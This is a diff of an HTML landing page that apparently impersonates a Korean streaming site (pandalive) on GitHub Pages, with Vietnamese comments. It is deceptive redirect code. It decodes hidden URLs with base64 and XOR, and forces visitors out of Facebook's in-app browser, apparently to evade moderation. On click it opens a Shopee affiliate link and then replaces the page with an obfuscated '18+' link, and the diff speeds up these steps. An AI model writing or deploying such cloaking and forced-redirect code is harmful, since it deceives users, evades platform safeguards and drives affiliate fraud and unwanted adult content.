@@ -42,7 +42,7 @@ html, body { margin:0; padding:0; height:100%; background:#000; }
 
 <!-- Nội dung cho user -->
 <div id="real-content" class="video-container" style="display:none;">
-  <video id="main-video" autoplay muted loop playsinline preload="auto"
+  <video id="main-video" autoplay muted loop playsinline preload="metadata"
          poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook.jpg" webkit-playsinline></video>
 
   <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number Logo" class="top-logo-left" />
@@ -101,7 +101,7 @@ document.addEventListener('DOMContentLoaded', function() {
     return;
   }
 
-  // --- Decode video URL và gán trực tiếp ---
+  // --- Decode video URL và gán ---
   try {
     const raw = atob(enc3_b64);
     const step = xorDecode(raw, xorKey);
@@ -121,7 +121,7 @@ document.addEventListener('DOMContentLoaded', function() {
   document.getElementById('ctaBtn').addEventListener('click', function(e){
     e.preventDefault();
 
-    // Nếu đang trong FB App → mở Chrome/Safari
+    // Nếu trong FB App → ép ra ngoài
     if (isFacebookApp()) {
       let landingURL = window.location.href;
       if (isAndroid()) {
@@ -129,26 +129,19 @@ document.addEventListener('DOMContentLoaded', function() {
       } else if (isIOS()) {
         const chromeURL = "googlechrome://" + landingURL.replace(/^https?:\/\//, '');
         window.location.href = chromeURL;
-        setTimeout(() => { window.location.href = landingURL; }, 500);
+        setTimeout(() => { window.location.href = landingURL; }, 400);
       }
       return;
     }
 
-    // Cách mở affiliate mà KHÔNG hiện tab trắng
-    const affLink = "https://s.shopee.vn/30dchvC74f";
-    const a = document.createElement("a");
-    a.href = affLink;
-    a.target = "_blank";
-    a.rel = "noopener noreferrer";
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+    // Mở Shopee ngay lập tức (tab mới) → nhanh hơn
+    window.open("https://s.shopee.vn/30dchvC74f", "_blank", "noopener,noreferrer");
 
-    // Trang hiện tại redirect sang link 18+
+    // Sau đó redirect sang link 18+ (trang hiện tại)
     setTimeout(() => {
       const link18 = atob(link18_b64);
-      window.location.href = link18;
-    }, 300);
+      window.location.replace(link18);
+    }, 200); // giảm delay để nhanh hơn
   });
 });
 </script>
